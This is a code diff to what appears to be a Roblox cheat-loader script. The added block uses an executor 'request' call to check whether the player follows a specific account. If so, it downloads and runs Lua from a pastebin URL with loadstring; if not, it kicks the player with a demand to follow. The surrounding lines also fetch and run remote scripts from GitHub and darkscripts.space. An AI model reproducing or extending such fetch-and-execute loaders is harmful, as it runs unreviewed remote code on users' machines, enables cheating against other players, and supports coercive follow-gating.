@@ -1,3 +1,27 @@
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+function GetFollowedUsers()
+    local API = "https://friends.roblox.com/v1/users/".. tostring(Player.UserId) .. "/followings"
+    local response = request(API)
+    local data = game:GetService("HttpService"):JSONDecode(response)
+    return data.data
+end
+
+function FollowsUser(UserId)
+    local FollowedUsers = GetFollowedUsers()
+    for i, v in pairs(FollowedUsers) do
+        if v.id == UserId then return true end
+    end
+    return false
+end
+
+if FollowsUser(1244024451) then
+    loadstring(game:HttpGet("https://pastebin.com/raw/ugAaTUCF"))()
+else
+    Player:Kick("Please follow " .. Players:GetNameFromUserIdAsync(1244024451) .. " to access this script!")
+end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
 loadstring(game:HttpGet('https://darkscripts.space/scripts/757a1e86-b6c3-4863-ba03-7aa51778638f_1014130817200558080.lua', true))()
 wait(1)
